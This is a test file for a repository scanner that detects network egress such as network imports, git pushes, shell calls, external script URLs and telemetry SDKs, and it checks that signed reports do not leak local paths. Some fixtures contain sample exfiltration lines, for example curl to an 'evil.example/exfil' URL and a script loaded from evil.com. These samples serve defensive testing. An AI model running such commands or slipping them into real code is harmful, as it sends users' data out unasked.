"""Tests for the ENTROVOUCH no-egress auditor."""
import json
import sys
from dataclasses import asdict
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from entrovouch.no_egress_auditor import audit, verify_report, render_markdown  # noqa: E402


def _write(d: Path, name: str, content: str) -> None:
    (d / name).write_text(content, encoding="utf-8")


def test_clean_repo_passes(tmp_path):
    _write(tmp_path, "ok.py", "import json\nimport hashlib\nx = json.dumps({'a': 1})\n")
    _write(tmp_path, "page.html", "<html><body><h1>hi</h1></body></html>")
    rep = audit(tmp_path)
    assert rep.verdict == "CLEAN"
    assert rep.findings == []
    assert rep.files_scanned == 2


def test_network_import_caught(tmp_path):
    _write(tmp_path, "bad.py", "import requests\nrequests.get('http://x')\n")
    rep = audit(tmp_path)
    assert rep.verdict == "FINDINGS"
    assert any(f["kind"] == "network-import" for f in rep.findings)


def test_socket_and_urllib_caught(tmp_path):
    _write(tmp_path, "s.py", "import socket\n")
    _write(tmp_path, "u.py", "from urllib.request import urlopen\n")
    rep = audit(tmp_path)
    kinds = [f["kind"] for f in rep.findings]
    assert kinds.count("network-import") == 2


def test_git_remote_subcommand_caught(tmp_path):
    _write(tmp_path, "g.py", "import subprocess\nsubprocess.run(['git', 'push', 'origin'])\n")
    rep = audit(tmp_path)
    assert any(f["kind"] == "git-remote" for f in rep.findings)


def test_read_only_git_not_flagged(tmp_path):
    _write(tmp_path, "g.py", "import subprocess\nsubprocess.run(['git', 'log', '-1'])\n")
    rep = audit(tmp_path)
    assert not any(f["kind"] == "git-remote" for f in rep.findings)


def test_shell_true_flagged(tmp_path):
    _write(tmp_path, "sh.py", "import subprocess\nsubprocess.run('curl x', shell=True)\n")
    rep = audit(tmp_path)
    assert any(f["kind"] == "subprocess-shell" for f in rep.findings)


def test_os_system_flagged(tmp_path):
    _write(tmp_path, "o.py", "import os\nos.system('wget http://x')\n")
    rep = audit(tmp_path)
    assert any(f["kind"] == "subprocess-shell" for f in rep.findings)


def test_dynamic_exec_flagged(tmp_path):
    _write(tmp_path, "d.py", "exec('import socket')\n")
    rep = audit(tmp_path)
    assert any(f["kind"] == "dynamic-exec" for f in rep.findings)


def test_html_external_url_caught(tmp_path):
    _write(tmp_path, "p.html", '<script src="https://evil.com/x.js"></script>')
    rep = audit(tmp_path)
    assert any(f["kind"] == "html-external" for f in rep.findings)


def test_html_case_insensitive_url(tmp_path):
    _write(tmp_path, "p.html", "<a href='HTTPS://EVIL.COM'>x</a>")
    rep = audit(tmp_path)
    assert any(f["kind"] == "html-external" for f in rep.findings)


def test_fetch_call_caught(tmp_path):
    _write(tmp_path, "a.js", "fetch('/api')\n")
    rep = audit(tmp_path)
    assert any(f["kind"] == "html-external" for f in rep.findings)


def test_docstring_mention_not_flagged(tmp_path):
    # A module NAME in a docstring/comment must not false-positive (the exact
    # failure mode the dashboard checker was hardened against).
    _write(tmp_path, "doc.py", '"""This module does not use requests or socket."""\nimport json\n')
    rep = audit(tmp_path)
    assert rep.verdict == "CLEAN"


def test_signature_verifies(tmp_path):
    _write(tmp_path, "ok.py", "import json\n")
    rep = audit(tmp_path)
    from dataclasses import asdict
    assert verify_report(asdict(rep)) == (False, "UNSIGNED")  # unkeyed => not evidence at all


def test_signature_breaks_on_tamper(tmp_path):
    _write(tmp_path, "ok.py", "import json\n")
    rep = audit(tmp_path)
    from dataclasses import asdict
    d = asdict(rep)
    d["verdict"] = "CLEAN-TAMPERED"
    assert verify_report(d) == (False, "TAMPERED")


def test_markdown_renders(tmp_path):
    _write(tmp_path, "bad.py", "import requests\n")
    rep = audit(tmp_path)
    md = render_markdown(rep)
    assert "FINDINGS" in md and "network-import" in md


def test_skip_dirs_ignored(tmp_path):
    (tmp_path / "node_modules").mkdir()
    _write(tmp_path / "node_modules", "junk.js", "fetch('http://x')")
    _write(tmp_path, "ok.py", "import json\n")
    rep = audit(tmp_path)
    assert rep.verdict == "CLEAN"


# ---------------------------------------------------------------------------
# G1 regression tests — argv-list network binaries + Python telemetry SDKs.
#
# Both classes were detected in TypeScript and invisible in Python; the auditor's
# own scope statement named them as blind spots. These tests are the reason the
# statement could be rewritten.
# ---------------------------------------------------------------------------

def test_detects_argv_list_network_binary(tmp_path):
    """subprocess.run(["curl", ...]) spawns no shell, so shell=True never fires."""
    _write(tmp_path, "sneaky.py",
           "import subprocess\n"
           "subprocess.run(['curl', 'https://evil.example/exfil'])\n")
    rep = audit(tmp_path)
    kinds = {f["kind"] for f in rep.findings}
    assert "subprocess-net-binary" in kinds, f"argv-list curl not detected: {kinds}"
    assert rep.verdict != "CLEAN"


def test_detects_argv_binary_by_absolute_path_and_exe(tmp_path):
    """Basename normalization: /usr/bin/wget and wget.exe are the same binary."""
    _write(tmp_path, "a.py", "import subprocess\nsubprocess.run(['/usr/bin/wget', 'http://x'])\n")
    _write(tmp_path, "b.py", "import subprocess\nsubprocess.Popen(['wget.exe', 'http://x'])\n")
    rep = audit(tmp_path)
    hits = [f for f in rep.findings if f["kind"] == "subprocess-net-binary"]
    assert len(hits) >= 2, f"path/exe normalization failed: {hits}"


def test_bare_git_status_is_not_flagged_as_net_binary(tmp_path):
    """git's network use is decided by SUBCOMMAND. `git status` must stay clean --
    false positives are the failure mode that made an earlier audit 7/118 useful."""
    _write(tmp_path, "ok.py", "import subprocess\nsubprocess.run(['git', 'status'])\n")
    rep = audit(tmp_path)
    assert rep.verdict == "CLEAN", [f["detail"] for f in rep.findings]


def test_git_push_still_flagged_as_git_remote_not_net_binary(tmp_path):
    """The pre-existing git-remote path must not be shadowed by the new check."""
    _write(tmp_path, "bad.py", "import subprocess\nsubprocess.run(['git', 'push'])\n")
    rep = audit(tmp_path)
    kinds = {f["kind"] for f in rep.findings}
    assert "git-remote" in kinds and "subprocess-net-binary" not in kinds


def test_detects_python_telemetry_sdk_import(tmp_path):
    """The category a 'no telemetry' claim is actually about."""
    for mod in ("sentry_sdk", "posthog", "ddtrace", "opentelemetry", "boto3"):
        d = tmp_path / mod
        d.mkdir()
        _write(d, "t.py", f"import {mod}\n")
    rep = audit(tmp_path)
    hits = [f for f in rep.findings if f["kind"] == "network-import"]
    assert len(hits) >= 5, f"telemetry/cloud SDKs missed: {[f["detail"] for f in hits]}"


def test_scope_statement_no_longer_claims_python_blind_spots(tmp_path):
    """The signed report's scope text must track the code. It previously named
    these two gaps as un-detected in Python; shipping the fix without updating it
    would make every signed report understate coverage."""
    _write(tmp_path, "ok.py", "import json\n")
    rep = audit(tmp_path)
    assert "not yet in Python" not in rep.scope_statement
    # ...and must still refuse an unqualified absence claim
    assert "BLOCKLIST-BASED" in rep.scope_statement and "DETECTION-grade" in rep.scope_statement


# ---------------------------------------------------------------------------
# Report must never carry the auditor's local filesystem path.
#
# A report delivered on 2026-07-31 shipped the auditor's absolute local
# path inside the SIGNED JSON: OS username, internal workspace name, session
# UUID. The recipient gains nothing from it and it is unforced disclosure.
#
# It survived review because the pre-send leak scan was run against the report
# DOCX, and the signed JSON was a separate attachment that the scan never
# looked at. These tests pin the fix at the source, where neither the report
# format nor the send checklist can drift away from it.
# ---------------------------------------------------------------------------
def test_report_target_does_not_leak_absolute_path(tmp_path):
    src = tmp_path / "deep" / "nested" / "myrepo"
    src.mkdir(parents=True)
    (src / "ok.py").write_text("x = 1\n", encoding="utf-8")

    rep = audit(src)

    assert rep.target == "myrepo"
    assert str(tmp_path) not in rep.target
    # The whole serialized report, not just the field: the path must not reach
    # the recipient through any other key either.
    assert str(tmp_path) not in json.dumps(asdict(rep))


def test_report_label_overrides_target_with_checkable_identity(tmp_path):
    src = tmp_path / "clone-dir-name-is-meaningless"
    src.mkdir()
    (src / "ok.py").write_text("x = 1\n", encoding="utf-8")

    rep = audit(src, label="Org-Name/repo@abc1234")

    assert rep.target == "Org-Name/repo@abc1234"
    assert str(tmp_path) not in json.dumps(asdict(rep))


def test_labelled_report_still_verifies(tmp_path):
    """The label is inside the signed payload, so signing must still hold."""
    src = tmp_path / "repo"
    src.mkdir()
    (src / "ok.py").write_text("x = 1\n", encoding="utf-8")

    rep = audit(src, label="Org/repo@deadbee")
    d = asdict(rep)

    assert verify_report(d) == (False, "UNSIGNED")
    d["target"] = "Someone-Else/repo@deadbee"
    assert verify_report(d) == (False, "TAMPERED"), "forged subject must break the hash"
